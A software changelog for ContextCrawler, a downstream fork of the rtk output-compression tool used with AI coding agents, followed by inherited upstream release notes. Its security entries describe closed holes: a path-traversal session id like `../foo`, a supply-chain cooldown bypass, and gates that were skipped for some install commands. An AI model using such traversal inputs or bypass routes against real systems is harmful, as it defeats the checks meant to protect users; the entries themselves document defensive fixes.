  `[contextcrawler: ...]`. (#4)

### Fixed (cosmetic, user-facing)

- `gain` dashboard header: `RTK Token Savings` → `ContextCrawler Token
  Savings` (Project and Global scopes). Empty-state hint reworded. (#1)
- `cc_economics` empty-state hint reworded. (#1)
- `init -g` success output: `RTK hook registered` → `ContextCrawler
  hook registered`; label `RTK.md:` now matches actual file
  `CONTEXTCRAWLER.md`; `@RTK.md reference added` → `@CONTEXTCRAWLER.md
  reference added` (sourced from the existing `RTK_MD_REF` constant).
  Companion fixes in uninstall messages, codex config listing, agent
  hook output for cline / windsurf / kilocode / antigravity, and the
  `init -g` usage help text. (#3)

### Added

- **Tirith gate status in `contextcrawler init -g`.** Reports whether
  the URL-security defense-in-depth gate will be armed at the Claude
  Code rewrite boundary. Detect-only — does NOT modify the user's
  `~/.bashrc` / `~/.zshrc` / `~/.config/fish/config.fish`. The gate
  operates exclusively at the CC PreToolUse hook layer via subprocess
  invocation of `tirith check`; no interactive-shell integration is
  involved. (#2 superseded by #5)

### Internal

- Source-level `rtk` identifiers, `rtk_cmd:` rule values, and
  `rtk_equivalent` classification keys are unchanged. Upstream
  rebase surface remains tight.

## [0.1.2] — 2026-05-14

The first release where `contextcrawler init -g` actually wires up a
working hook on a fresh install. Anyone who tagged-installed v0.1.0 or
v0.1.1 should upgrade.

### Fixed (critical)

- **Hook command was hardcoded to `rtk hook claude`.** Every `init -g`
  since the binary rename was writing a settings.json entry that called
  a non-existent `rtk` binary. The hook fired, the binary wasn't there,
  the bash hook gracefully degraded — Claude Code received raw,
  un-filtered command output. ContextCrawler was effectively a no-op
  on every install. Now writes `contextcrawler hook claude` (and
  `contextcrawler hook cursor` / `gemini` / `copilot` for the other
  agents). Install-time matchers recognize the legacy command string
  so existing broken entries get migrated cleanly on next `init -g`.

### Fixed (security)

- **Session compactor path traversal** (`resolve_session_path`). A bare
  session id like `../foo` was joined under each project directory and
  the resulting candidate was opened if it resolved to a file. Now
  rejects ids containing `/`, `\`, or `..`. Full paths still work via
  the existing `is_file()` short-circuit.
- **Supply-chain cooldown bypass on future-dated publishes.** The age
  check guarded against impossible future dates with `age > -1d`, but
  packages "published" up to 24h ahead of now passed both bounds and
  skated through entirely. Now clamps negative ages to zero before the
  comparison — future dates are treated as just-published.

### Fixed (UX — broken instruction strings)

- Every `[rtk] No hook installed — run \`rtk init -g\`` warning, every
  integrity-check error message, every codex/gemini/copilot install
  hint, every "rtk trust" / "rtk discover" / "rtk learn" tip now reads
  `contextcrawler` so pasted commands actually work.
- `~/.claude/RTK.md` and `@RTK.md` reference renamed to
  `CONTEXTCRAWLER.md` and `@CONTEXTCRAWLER.md`. Auto-migration
  (`cleanup_legacy_rtk_md`) removes legacy files + references on first
  install with v0.1.2.
- `gain` table no longer prefixes every row with the redundant `rtk `
  string (DB unchanged, strip happens at display time).

### Fixed (small)

- Compiler warning in `core/utils.rs` (unused variable on non-Windows
  release builds).
- CodeQL `py/insecure-temporary-file` in benchmark helper — switched
  `tempfile.mktemp` to `NamedTemporaryFile`.
- CodeQL `rust/cleartext-logging` false-positive in trust list defused
  via variable rename. Two related alerts on the same site dismissed in
  the GitHub Security UI.

### Docs

- README + MIGRATING: new pre-install callout warning users who
  previously ran upstream `rtk` or `jee599/contextzip` to clean out
  stale hook entries from agent configs — otherwise the v0.1.2 binary
  takes over and the orphaned entries point at non-existent paths.
- README install switched from `--branch develop` to `--tag v0.1.2` by
  default; bleeding-edge `--branch develop` kept as a separate opt-in.

---

## [0.1.1] — 2026-05-14

Security fixes from a dual Codex + Claude review of the downstream gate
code. Five real issues, all consensus between both reviewers.

### Fixed

- **supply-chain: OSV severity threshold now actually applies.** Every
  CVE was being marked `Severity::High` in the verdict loop and the
  `osv_severity()` helper was dead code. Result: `block_severity =
  "CRITICAL"` silently passed HIGH CVEs through the gate. `osv_query()`
  now returns per-vuln severity and the caller compares against the
  configured threshold.
- **supply-chain: editable / URL / path tokens no longer exempt their
  siblings.** `pip install -e . requests` was skipping the entire
  command and never vetting `requests`. Pure URL/tarball installs
  returned Allow with no findings. Now: named packages are always
  vetted; when `allow_editable=false` and an editable token is present,
  a new `FindingReason::UnvettableSource` is produced for manual review.
- **supply-chain: cache path traversal guard.** Package names containing
  `..`, backslashes, control chars, or colons now refuse to cache
  instead of resolving to a path outside `~/.cache/contextcrawler/`.
- **tirith: verdict parsed structurally, not by substring.** Tirith
  responses with whitespace variations (`{"action": "block"}`) or
  the word "block" inside a description string no longer mis-route the
  verdict. Pretty-printed output also works.
- **web: DOM walk depth-capped.** `extract_element_text` now bails at
  `MAX_DOM_DEPTH = 256`, preventing stack overflow on adversarial
  deeply-nested HTML.
- **rewrite_cmd: legacy bash-hook path now runs the supply-chain gate.**
  Previously only the modern `contextcrawler hook claude` path checked
  installs; the legacy `rtk rewrite` exit-code protocol skipped it.
  Coverage is now consistent across both hook entry points.

### Added

- `cache_file_rejects_traversal`, `mixed_editable_and_named_keeps_named_packages`,
  `osv_severity_extracts_from_database_specific` regression tests.

### Changed

- `gain` no longer displays the literal `rtk ` prefix on every row
  (it's identical across all entries — strip it at display time so the
  table stays useful). DB schema unchanged.

---

## [0.1.0] — 2026-05-14

First public release. ContextCrawler is a downstream distribution of
[rtk-ai/rtk](https://github.com/rtk-ai/rtk) (v0.39.0) that brings the
[jee599/contextzip](https://github.com/jee599/contextzip) feature set
forward to a current rtk base, plus an opt-in Tirith defense-in-depth
gate and an in-tree supply-chain pre-install gate.

### One binary

- **`contextcrawler`** — single canonical CLI. `--version` reads
  `contextcrawler ContextCrawler 0.1.0 (downstream of rtk 0.39.0)`.
- Cargo package renamed from `rtk` to `contextcrawler`. Source-level
  `rtk` identifiers retained (mod / use / struct names) to keep upstream
  rebase friction minimal.

### Added (over jee599/contextzip 0.2.0 / rtk 0.30.1 baseline)

- 9 minor versions of upstream rtk improvements: lexer-based compound-command
  splitter, permission-verdict system (deny / ask / allow / default with
  least-privilege default), new per-language modules (vitest, playwright,
  prisma, rake, rspec, rubocop, ...), additional agent hook integrations
  (codex, cursor, copilot VS Code, opencode, hermes, kilocode, antigravity,
  windsurf), and 60+ TOML filter configs.
- `contextcrawler web <url>` — fetch a URL with curl and extract main
  content from HTML responses via `scraper`, stripping nav / ads / scripts.
  ~86% byte savings on real pages (e.g., rust-lang.org homepage:
  18,686 → 2,513 bytes).
- Multi-language stacktrace compression (Node.js, Python, Rust, Go, Java)
  as a post-processor in `core/runner.rs`. Detects framework frames and
  drops them, keeping user-code frames only.
- Tirith pre-execution gate at the auto-allow rewrite boundary. When
  [`tirith`](https://tirith.sh) is installed, every rewrite that would
  receive `permissionDecision: "allow"` is first run past `tirith check`.
  Block-level findings downgrade the verdict to *Ask* so the user reviews
  the original command. Wired into both the legacy `rewrite` path and the
  modern `contextcrawler hook claude` path so coverage is consistent.
  Default fail-open; set `CONTEXTCRAWLER_TIRITH_REQUIRED=1` for fail-closed.
- `contextcrawler security` subcommand. Surfaces Tirith audit stats, gate
  mode, and shell-hook configuration status. Text and JSON output.
- `contextcrawler security log` subcommand. Merged gate-activity log
  (Tirith downgrades + supply-chain events) sorted by timestamp.
  `--limit N`, `--json`, and `--histogram` for at-a-glance bucketed
  counts by `(source, category)` with proportional bars.
- `contextcrawler supply-chain check '<cmd>'` — pre-install age and
  OSV CVE inspection for `npm` / `pnpm` / `yarn` and `pip` / `uv` /
  `poetry` / `pipx` install commands. Wired into the auto-allow path
  so block reasons (age below cooldown, known CVE) downgrade to *Ask*.
  Honors pinned versions; 24h disk cache at
  `~/.cache/contextcrawler/supply-chain/`. Opt-in via
  `~/.config/contextcrawler/supply-chain.toml`.
- `contextcrawler sessions` subcommand group for Claude Code session-JSONL
  compaction:
  - `contextcrawler sessions compact <id|path>` — write a `.compressed`
    sidecar (also accepts `--all-sessions` for batch mode and `--dry-run`)
  - `contextcrawler sessions apply <id>` — promote the sidecar to live
  - `contextcrawler sessions expand <id>` — roll back via `.bak`
  - `$CLAUDE_PROJECTS_DIR` env override for non-default session locations
- Sentinel-block discipline: every downstream addition to upstream-owned
  files lives between `// ===== contextzip-downstream =====` marker pairs.
  Reduces rebase conflict surface when upstream rtk moves.

### Changed

- Full rename: Cargo package `rtk` → `contextcrawler`. Binary, package
  name, and clap `name = ...` all match. Source-level `rtk` module/use/
  struct identifiers retained for upstream rebase compatibility.
- Hook scripts (`hooks/claude/rtk-rewrite.sh`,
  `hooks/cursor/rtk-rewrite.sh`, `hooks/opencode/rtk.ts`) updated to call
  `contextcrawler` instead of `rtk`. Filenames are kept (upstream-owned
  paths) to minimize rebase friction.
- Upstream version-guard logic in the hook scripts replaced with a comment
  — the guard parsed `rtk <ver>` output, which doesn't match
  ContextCrawler's banner format. ContextCrawler always ships against a
  recent rtk core so the guard isn't load-bearing.
- SPDX-License-Identifier headers added to all downstream-introduced
  source files with explicit upstream attribution.

### Removed

- `build_cmd` generic build-error grouper (was at
  `jee599/contextzip/src/build_cmd.rs`). Subsumed by rtk 0.39's per-language
  modules: `cmds/js/tsc_cmd.rs`, `cmds/rust/cargo_cmd.rs`,
  `cmds/python/mypy_cmd.rs`, `cmds/js/lint_cmd.rs`.
- Telemetry scaffolding. ContextCrawler does not phone home.
- Self-update path. Update via `cargo install` or rebuild from source.
- Standalone `contextcrawler-session` crate (formerly under
  `session-compactor/`). Its functionality is now folded into the main
  binary as `contextcrawler sessions {compact|apply|expand}`.

### Attribution

- Upstream base: [rtk-ai/rtk](https://github.com/rtk-ai/rtk) v0.39.0,
  Apache-2.0 (per `LICENSE`) / MIT (per `Cargo.toml`).
- Compactor + stacktrace + HTML modules originated in
  [jee599/contextzip](https://github.com/jee599/contextzip), MIT. Each
  carried-over file has a per-file SPDX header citing the upstream.
- [Tirith](https://github.com/sheeki03/tirith), AGPL-3.0, invoked via
  subprocess only — no statically linked AGPL code.

---

## Inherited upstream rtk-ai/rtk history below

_The entries below originate from upstream rtk-ai/rtk and predate the_
_ContextCrawler downstream. Preserved for attribution and context._

# Changelog

All notable changes to rtk (Rust Token Killer) will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.39.0](https://github.com/rtk-ai/rtk/compare/v0.38.0...v0.39.0) (2026-05-06)


### Features

* **cicd:** add auto next release parser ([bf24972](https://github.com/rtk-ai/rtk/commit/bf24972e7d463f0432b8315e3035e9eb13ff062f))
* **cicd:** target develop branch ([63da7da](https://github.com/rtk-ai/rtk/commit/63da7dafd61b5f65115989aeda01f666a64457ff))


### Bug Fixes

* **cicd:** match ":" for body prefix to catch ([5987333](https://github.com/rtk-ai/rtk/commit/5987333209cd59c1e22f9e0b247ab390cb431dbf))
* **cicd:** match allowed repo list in pr bodies ([b1233ab](https://github.com/rtk-ai/rtk/commit/b1233ab3fbc0927145d5c0f763725b098fc7dd99))
* **curl:** gate force_tee_hint, extend JSON heuristic, avoid full-body alloc ([2ed53c7](https://github.com/rtk-ai/rtk/commit/2ed53c7fa26922860af20c445b39cbb66862f180))
* **curl:** JSON passthrough + IsTerminal gate to prevent invalid JSON output ([02da3d0](https://github.com/rtk-ai/rtk/commit/02da3d070271f800731a94a3249f3feb9dd7c7b8)), closes [#1536](https://github.com/rtk-ai/rtk/issues/1536) [#1282](https://github.com/rtk-ai/rtk/issues/1282)
* dotnet cmd test flakiness ([17ffe62](https://github.com/rtk-ai/rtk/commit/17ffe624d415f05ca4c29e97ca650594778231be))
* **git:** address review feedback on status state surfacing ([316e65e](https://github.com/rtk-ai/rtk/commit/316e65ef5baa6b926725b8d9a08c8d2ab52c159d))
* **git:** compact in-progress status state ([cff391e](https://github.com/rtk-ai/rtk/commit/cff391e50b5fa89ae83eed5fd4274c7c444d37f0))
* **git:** drop state-hint extraction in compact status ([e91dee5](https://github.com/rtk-ai/rtk/commit/e91dee568bdcca0933b137edccc077db9ff006fa))
* **git:** surface in-progress state in compact `rtk git status` ([017d0f9](https://github.com/rtk-ai/rtk/commit/017d0f9ee6bb799717958d9f3fd3eee4b0e6ca3c))
* **grep:** adjust the command to fall through if the output would already be as small as possible ([09e1c0a](https://github.com/rtk-ai/rtk/commit/09e1c0ad4b474631b8e058ce69ca2bbd46484c7f))
* head/tail multi-file rewrite falls back to native command ([#1362](https://github.com/rtk-ai/rtk/issues/1362)) ([f75a10b](https://github.com/rtk-ai/rtk/commit/f75a10b1a2bd824814247a03bded76fa49ddf663))
* **init-uninstall:** uninstall removes --claude-md artifacts on Windows ([d395f97](https://github.com/rtk-ai/rtk/commit/d395f975c3db7e1cbc825006091e1dcc3867844d))
* **init-uninstall:** uninstall removes --claude-md artifacts on Windows ([aad0db8](https://github.com/rtk-ai/rtk/commit/aad0db8b5213bd0940ca05f684ecda87de0d93af))
* **json:** expand char boundary truncation test ([7840030](https://github.com/rtk-ai/rtk/commit/784003055e85b5e6a51f69c2ce0b10662f1b36af))
* **json:** use char boundary when truncating long string values ([533894a](https://github.com/rtk-ai/rtk/commit/533894a77ec5b8f7374547e994124bcf3a730f0b))
* **ls:** handle all file types (device, pipe, socket) in ls filter ([e456be1](https://github.com/rtk-ai/rtk/commit/e456be1c1674a32839694446504310a2c16ce7dd))
* **ls:** handle device files (block, char, pipe, socket) in ls filter ([cac8ce7](https://github.com/rtk-ai/rtk/commit/cac8ce775b695c5837b36ea788ba6812bcae214d)), closes [#844](https://github.com/rtk-ai/rtk/issues/844)
* **ls:** LC_ALL=C + fallback to raw on unrecognized locale ([bf6d4b2](https://github.com/rtk-ai/rtk/commit/bf6d4b2ea22f026d3ec4d909aef81156b0436509))
* **pnpm:** install don't take a list of packages ([492aa76](https://github.com/rtk-ai/rtk/commit/492aa76ed3842549d2a453becbf2782caba765f1))

## [0.38.0](https://github.com/rtk-ai/rtk/compare/v0.37.2...v0.38.0) (2026-04-29)


### Features

* **cicd:** enforce cicd sast & package check ([3bbbb49](https://github.com/rtk-ai/rtk/commit/3bbbb492f33f0e619ab0d1dbce4389ad49e763ae))
* **gains:** add --reset flag ([e3149cb](https://github.com/rtk-ai/rtk/commit/e3149cb7fbed18eae95f753664ddd8eaaaf6cc39))
* **glab:** add GitLab CLI (glab) command support ([048f2f9](https://github.com/rtk-ai/rtk/commit/048f2f980bd95c5918f309d1d7ebc096d196f00d))
* **glab:** add GitLab CLI (glab) command support ([bc31f3f](https://github.com/rtk-ai/rtk/commit/bc31f3f0f39077884e8d52c3508e840b355f682e)), closes [#851](https://github.com/rtk-ai/rtk/issues/851)


### Bug Fixes

* **benchmark:** benchmark capture all fd only stream ([c590bd6](https://github.com/rtk-ai/rtk/commit/c590bd69329bb82608666958c7e06bf169a7d577))
* **benchmark:** capture all fd for stream cmd benchmark ([e6c2523](https://github.com/rtk-ai/rtk/commit/e6c2523be1180772e40c175e2f9a523d349fb13d))
* **benchmark:** extract format_diff_changes + remove wrong diff test ([e7ae6bf](https://github.com/rtk-ai/rtk/commit/e7ae6bf018882dba248f151ba4ec4929300b3e36))
* **cicd:** : no semgrep alert on sh call cicd ([7681daf](https://github.com/rtk-ai/rtk/commit/7681dafc76f164cfad588fe37d9a165dcb476e10))
* **discover:** also encode '_', '\', and non-ASCII chars in project path slug ([73a05c3](https://github.com/rtk-ai/rtk/commit/73a05c3262b6410cb24370d939c428d1dc0c7a77)), closes [#1457](https://github.com/rtk-ai/rtk/issues/1457)
* **discover:** encode '.' as '-' in project path slug ([2d031f3](https://github.com/rtk-ai/rtk/commit/2d031f32e9ad4452c2cc229c030ea6c0936c8bec)), closes [#1457](https://github.com/rtk-ai/rtk/issues/1457)
* **filters:** benchmark ci update + fix stream + filter quality ([137af04](https://github.com/rtk-ai/rtk/commit/137af0493189a86020da1feaa1de74df92466137))
* **filters:** benchmark ci update + fix stream filter quality ([88d9f6a](https://github.com/rtk-ai/rtk/commit/88d9f6a0d94fd2b5b3d40c956e966756670a2704))
* **git:** fix empty output when branch name contains '/' in git diff ([e070226](https://github.com/rtk-ai/rtk/commit/e0702260a94377b6bbec5cb79d91d81cba17b0ec))
* **git:** fix empty output when branch name contains '/' in git diff ([13188a8](https://github.com/rtk-ai/rtk/commit/13188a88b22f692157b89874f4c76287a0b3ecae)), closes [#1431](https://github.com/rtk-ai/rtk/issues/1431)
* grep false negatives, output mangling, and truncation annotations ([de41533](https://github.com/rtk-ai/rtk/commit/de415335ea069c06370855366945a3704579ee18))
* **install:** resolve version via redirect to avoid GitHub API rate limits ([5e1a641](https://github.com/rtk-ai/rtk/commit/5e1a64180f094ae456780a78b675f243312089c6))
* **npm:** regex match end line ([5e84e94](https://github.com/rtk-ai/rtk/commit/5e84e9471736fe58e89094854f4123ecb07c2d3b))
* **npx:** dispatch unknown tools to npx instead of npm ([2c4569c](https://github.com/rtk-ai/rtk/commit/2c4569caa64d013ad4ada0b7580f9f16d8334c19)), closes [#815](https://github.com/rtk-ai/rtk/issues/815)
* remove wrong cicd benchmark + npm test regex ([7e3690a](https://github.com/rtk-ai/rtk/commit/7e3690a23ab158ca8e1e890650554e20e3a0c17b))
* **stream:** add semgrep flag for sh tests ([7cfcdbe](https://github.com/rtk-ai/rtk/commit/7cfcdbec8681b15b794b6aef982ccb38feb79fd7))
* **stream:** add semgrep flag for sh tests ([d327724](https://github.com/rtk-ai/rtk/commit/d327724f814b6875903366db0b0616780b454ad1))
* **stream:** route to respective fd ([605e335](https://github.com/rtk-ai/rtk/commit/605e335f0546d2ed8554a95e7749a0b494c510e3))
* **stream:** route to respective fd ([81a1be6](https://github.com/rtk-ai/rtk/commit/81a1be6a744942515347dd296ddcf7d9f126200d))
* **tracking:** test env path ([70b36b4](https://github.com/rtk-ai/rtk/commit/70b36b4dbc3e147219ad87cf539d073523b86a85))

## [0.37.2](https://github.com/rtk-ai/rtk/compare/v0.37.1...v0.37.2) (2026-04-20)


### Bug Fixes

* **discover:** exclude_commands bypass for env-prefix, sub cmd + regex ([ca4c59c](https://github.com/rtk-ai/rtk/commit/ca4c59c230306d310069bed3c0ba930068dc4dc4))
* **discover:** exclude_commands bypass for env-prefix, sub cmd + regex ([42d3161](https://github.com/rtk-ai/rtk/commit/42d3161872713bc0b20ef49b0714add40c40d5e3))
* **discover:** word boundary in exclude_commands ([0ea115b](https://github.com/rtk-ai/rtk/commit/0ea115bca5fa66daa69fda2f0eeaaf103346b3a4))
* **docs:** add missing docs for exclude commands patterns ([2e401ac](https://github.com/rtk-ai/rtk/commit/2e401ac38feec88de8d5e46f0301c8a532b95614))
* **hooks:** add regression test for windows native ([115e448](https://github.com/rtk-ai/rtk/commit/115e44853b8cdd2d7af3af2b52c9c31e924a45d3))
* **hooks:** windows use 'rtk hook claude' no fallback ([da3c432](https://github.com/rtk-ai/rtk/commit/da3c432201240f0da9627d8cc6bc70e5b7f8bdfe))
* **hooks:** windows use 'rtk hook claude' no fallback ([0e29650](https://github.com/rtk-ai/rtk/commit/0e29650e11959730f4c4a2e6d6c0519e14dc8595))
* **tests:** windows regression test fix path ([13a73dd](https://github.com/rtk-ai/rtk/commit/13a73ddfd78460560a1f5fde94b54b1f848b41b5))

## [0.37.1](https://github.com/rtk-ai/rtk/compare/v0.37.0...v0.37.1) (2026-04-18)


### Bug Fixes

* **docs:** user facing docs ([c8d6878](https://github.com/rtk-ai/rtk/commit/c8d68787fb8b31c52125e9fc7ea62e0aa590485f))

## [0.37.0](https://github.com/rtk-ai/rtk/compare/v0.36.0...v0.37.0) (2026-04-17)


### Features

* **discover:** handle more npm/npx/pnpm/pnpx patterns ([9e96caa](https://github.com/rtk-ai/rtk/commit/9e96caa0a18a95c84da82ba57716a9d3ef86d0c8))
* **refacto-core:** binary hook w/ native cmd exec + streaming ([e7b7f9a](https://github.com/rtk-ai/rtk/commit/e7b7f9ab665a0f7303d41d23ad156d24e5e8964e))


### Bug Fixes

* **docs:** use release please changelog no manual ([7591a14](https://github.com/rtk-ai/rtk/commit/7591a14e4ceb732ab7ca160ac01a852926abe77a))
* isolate cursor hook tests from local settings (determinist) ([d8ddefe](https://github.com/rtk-ai/rtk/commit/d8ddefe78efe25c35bb2a2f9083f2eacb9dd7274))
* P0+P1 fixes from pre-merge review of hook engine ([df8e035](https://github.com/rtk-ai/rtk/commit/df8e03558d4d6cc2f5cbac91c63ab1b3b51d3bcd))
* P0+P1 fixes from pre-merge review of hook engine ([d34389c](https://github.com/rtk-ai/rtk/commit/d34389c3d0936c2b0790e14f450bb50a28a7edf7))
* rename ship.md to ship/SKILL.md to match develop ([5916ecd](https://github.com/rtk-ai/rtk/commit/5916ecd86fb319c2519a0b4fb2891309833a3bb4))
* **runner:** preserve fd separation on command failure ([e92d099](https://github.com/rtk-ai/rtk/commit/e92d0993c93f0b732316dfa932d265aeca7488d6))
* **stream:** missing stderr fields ([a1d46f3](https://github.com/rtk-ai/rtk/commit/a1d46f39c291e3356b9c26a062bde05ba1de591a))

## [0.36.0](https://github.com/rtk-ai/rtk/compare/v0.35.0...v0.36.0) (2026-04-13)


### Features

* **benchmark:** add multipass VM integration test suite ([6e7863b](https://github.com/rtk-ai/rtk/commit/6e7863bf313b0d18a47cf0ca2cdaea03cc2ed900))
* **benchmark:** add multipass VM integration test suite ([d22759b](https://github.com/rtk-ai/rtk/commit/d22759b8c5254ad9c4a455f10cb7de75e92df581))
* **benchmark:** add Swift ecosystem tests (6 commands + savings) ([1fbb6d9](https://github.com/rtk-ai/rtk/commit/1fbb6d935b4a0d031a7862cba312eebe1303ba9b))
* **init:** add native support for Kilo Code and Google Antigravity ([d0a3797](https://github.com/rtk-ai/rtk/commit/d0a3797ec580f96948489d1e7c3329ac22a6c4eb))
* **init:** add support for kilocode and antigravity agents ([66b90f1](https://github.com/rtk-ai/rtk/commit/66b90f1ed3de81acdce61164c068c24ed7ef29db))
* **pnpm:** Add filter argument support ([2ba8d37](https://github.com/rtk-ai/rtk/commit/2ba8d372df186b4056a3b8906fc25cde8586dd42))
* **skills:** add /pr-review skill for batch PR review ([21e67a1](https://github.com/rtk-ai/rtk/commit/21e67a1113041b74542d0285e5f74587dfb30b65))
* **telemetry:** enrich daily ping with gap detection and quality metrics ([644c50f](https://github.com/rtk-ai/rtk/commit/644c50f786e5c567617e7ea907c5f312797b1265))


### Bug Fixes

* **benchmark:** address PR review feedback ([87ee81f](https://github.com/rtk-ai/rtk/commit/87ee81f08be5e7b1ca79513b1a91925d455f4f5c))
* **benchmark:** address review feedback from @FlorianBruniaux ([d13c185](https://github.com/rtk-ai/rtk/commit/d13c185aac64d14288b574df44623723a69e7b95))
* **ccusage:** add --yes flag and warn when falling back to npx ([f68fa00](https://github.com/rtk-ai/rtk/commit/f68fa0087c03d6882993b7b3eaee98e1dbab41b4))
* **clippy:** show full error blocks instead of truncated headline ([95d9d13](https://github.com/rtk-ai/rtk/commit/95d9d134b0b76d83b6162614b0a79269b2135f40))
* **clippy:** show full error blocks instead of truncated headline ([f4074f8](https://github.com/rtk-ai/rtk/commit/f4074f898a9b73b72bbcd8b18afab4831dcda406)), closes [#602](https://github.com/rtk-ai/rtk/issues/602)
* **curl:** skip JSON schema conversion for internal/localhost URLs ([577c311](https://github.com/rtk-ai/rtk/commit/577c311ecaaa8ae94f22dbe252152424d4333d04))
* **discover:** preserve golangci-lint flags in rewrite ([d85303e](https://github.com/rtk-ai/rtk/commit/d85303ec4893deb904260f5dc11b7df906a50c07))
* **docs:** update TELEMETRY.md to match code after review fixes ([be5c057](https://github.com/rtk-ai/rtk/commit/be5c0576d95566f37f266fd9f92e2a1b263697bd))
* **find:** include hidden files when pattern targets dotfiles ([#1101](https://github.com/rtk-ai/rtk/issues/1101)) ([dbeeaed](https://github.com/rtk-ai/rtk/commit/dbeeaed16aee79674ec2fd3778b7b11b10b847c6))
* **git:** re-insert -- separator when clap consumes it from git diff args ([#1215](https://github.com/rtk-ai/rtk/issues/1215)) ([9979c69](https://github.com/rtk-ai/rtk/commit/9979c699307a4adad2c2df0f2bc3b663df653311))
* **git:** remove -u short alias from --ultra-compact to fix git push -u ([6b76fdb](https://github.com/rtk-ai/rtk/commit/6b76fdb87d7c54cfc2a1b0e6117dd78b8430910b))
* **golangci-lint:** restore run wrapper and align guidance ([4f4e4d2](https://github.com/rtk-ai/rtk/commit/4f4e4d2b5a3529030fe4089f60d2f4b8740b5d53))
* **golangci-lint:** support inline global flags before run ([24f2ada](https://github.com/rtk-ai/rtk/commit/24f2adaf8fb541c2564fa7dfb423947932e68fb4))
* **go:** prevent double-counted failures when test-level fail also triggers package-level fail ([#958](https://github.com/rtk-ai/rtk/issues/958)) ([4fc15ef](https://github.com/rtk-ai/rtk/commit/4fc15ef2c1c80336ffaafa4179db4cee6f39236a))
* **go:** prevent double-counting failures when package-level fail cascades from test failures ([#958](https://github.com/rtk-ai/rtk/issues/958)) ([9722d5e](https://github.com/rtk-ai/rtk/commit/9722d5ebd8916f9b398bdc01b1102d42ab2b8795))
* **hooks:** ensure default permission verdict prompts user for confirmation ([40462c0](https://github.com/rtk-ai/rtk/commit/40462c05e66f116928de365a0d271bdfd61cec72))
* **hooks:** require all segments to match allow rules ([#1213](https://github.com/rtk-ai/rtk/issues/1213)) ([40c9dbc](https://github.com/rtk-ai/rtk/commit/40c9dbc7dbbf9332d6859060765c582a880f0fde))
* **init:** honor CODEX_HOME for Codex global paths ([d442799](https://github.com/rtk-ai/rtk/commit/d442799e34d522c87a6eb60c2ff373385d201315))
* **init:** install Codex global instructions in CODEX_HOME ([a257688](https://github.com/rtk-ai/rtk/commit/a2576883a27c5f915ba0ae7883a51006411b3ae5))
* **json:** rename --schema to --keys-only, closes [#621](https://github.com/rtk-ai/rtk/issues/621) ([c16713a](https://github.com/rtk-ai/rtk/commit/c16713a973b563a6cba283c830b67c8c470e419f))
* **ls:** filter quality wrong truncation ([aa6317f](https://github.com/rtk-ai/rtk/commit/aa6317fb83a5d9883623a4d3bee7a25bc99dcb4c))
* **permissions:** glob_matches middle-wildcard matches commands without trailing args ([#1105](https://github.com/rtk-ai/rtk/issues/1105)) ([3db8070](https://github.com/rtk-ai/rtk/commit/3db8070b51b9a312fcca20a8460d3d6259cc38b7))
* **pnpm:** list command not working ([ba235d8](https://github.com/rtk-ai/rtk/commit/ba235d85974c0a85b25e290a8bb83648800438a6))
* **pytest:** -q mode summary line not detected ([57502a5](https://github.com/rtk-ai/rtk/commit/57502a5bef1fb56109a57cf2ea7377fd271253a7))
* report package-level failures (timeouts, signals) in go test summary ([0b1c32b](https://github.com/rtk-ai/rtk/commit/0b1c32b3cc9a3e73418d401d1d481c1611c7ec0b))
* report package-level failures (timeouts, signals) in go test summary ([c85a387](https://github.com/rtk-ai/rtk/commit/c85a387363e2079234b6141aad26418172c0e61a)), closes [#958](https://github.com/rtk-ai/rtk/issues/958)
* **security:** correct email domain from .dev to .app ([47383e8](https://github.com/rtk-ai/rtk/commit/47383e80197fc56e38f880f33a6b54261b82523c))
* **tee:** prevent panic on UTF-8 multi-byte truncation boundary ([da486bf](https://github.com/rtk-ai/rtk/commit/da486bf394330c804cd1cd12e4b6835f18de5205))
* **telemetry:** 7 bugs in enrichment — privacy leak, broken meta_usage, pricing ([15f666d](https://github.com/rtk-ai/rtk/commit/15f666dd8dbd18648cb7bd14a6f9f3cac2f7d10b))
* **telemetry:** clean code ([8156081](https://github.com/rtk-ai/rtk/commit/81560812610686fa5ca3633c2bf0b79c05eaa7d9))
* **telemetry:** consent, erasure, auth, docs ([2e4cc4b](https://github.com/rtk-ai/rtk/commit/2e4cc4bb5226444c8c0bfc827baf0c101c3759e8))
* **telemetry:** non-terminal consent, single config load ([7821e98](https://github.com/rtk-ai/rtk/commit/7821e9872fd1f1ae9b40eb8a4458049869acc36b))
* **telemetry:** RGPD-compliant, consent gate, erasure, privacy controls ([6a5bc84](https://github.com/rtk-ai/rtk/commit/6a5bc847e06cf6066e6f4aeed5a3ad0803a3649b))

## [0.35.0](https://github.com/rtk-ai/rtk/compare/v0.34.3...v0.35.0) (2026-04-06)


### Features

* **aws:** expand CLI filters from 8 to 25 subcommands ([402c48e](https://github.com/rtk-ai/rtk/commit/402c48e66988e638a5b4f4dd193238fc1d0fe18f))


### Bug Fixes

* **cmd:** read/cat multiple file and consistent behavior ([3f58018](https://github.com/rtk-ai/rtk/commit/3f58018f4af1d7206457929cf80bb4534203c3ee))
* **docs:** clean some docs + disclaimer ([deda44f](https://github.com/rtk-ai/rtk/commit/deda44f73607981f3d27ecc6341ce927aab34d37))
* **gh:** pass through gh pr merge instead of canned response ([#938](https://github.com/rtk-ai/rtk/issues/938)) ([8465ca9](https://github.com/rtk-ai/rtk/commit/8465ca953fa9d70dcc971a941c19465d456eb7d4))
* **gh:** pass through gh pr merge instead of canned response ([#938](https://github.com/rtk-ai/rtk/issues/938)) ([e1f2845](https://github.com/rtk-ai/rtk/commit/e1f2845df06a8d8b8325945dc4940ec5f530e4cc))
* **git:** inherit stdin for commit and push to preserve SSH signing ([#733](https://github.com/rtk-ai/rtk/issues/733)) ([eefeae4](https://github.com/rtk-ai/rtk/commit/eefeae45656ff2607c3f519c8eae235e3f0fe411))
* **git:** inherit stdin for commit and push to preserve SSH signing ([#733](https://github.com/rtk-ai/rtk/issues/733)) ([6cee6c6](https://github.com/rtk-ai/rtk/commit/6cee6c60b80f914ed9505e3925d85cadec43ab97))
* **git:** preserve full diff hunk headers ([62f4452](https://github.com/rtk-ai/rtk/commit/62f445227679f3df293fe35e9b18cc5ab39d7963))
* **git:** preserve full diff hunk headers ([09b3ff9](https://github.com/rtk-ai/rtk/commit/09b3ff9424e055f5fe25e535e5b60e077f8344f9))
* **go:** avoid false build errors from download logs ([9c1cf2f](https://github.com/rtk-ai/rtk/commit/9c1cf2f403534fa7874638b1b983c2d7f918a185))
